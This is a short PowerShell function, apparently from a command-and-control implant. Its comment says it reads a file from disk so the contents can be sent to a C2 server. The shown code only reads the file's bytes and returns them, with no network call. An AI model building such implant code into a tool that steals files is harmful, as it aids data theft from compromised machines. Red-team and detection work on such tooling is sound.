# download - gets the file content on disk and stores it in results so 
# we can send it over to the C2 server
function func_download 
{
    param([string] $file_path) # the file path on disk we want to download
    
    $results = [System.IO.File]::ReadAllBytes($file_path)

    return $results
}
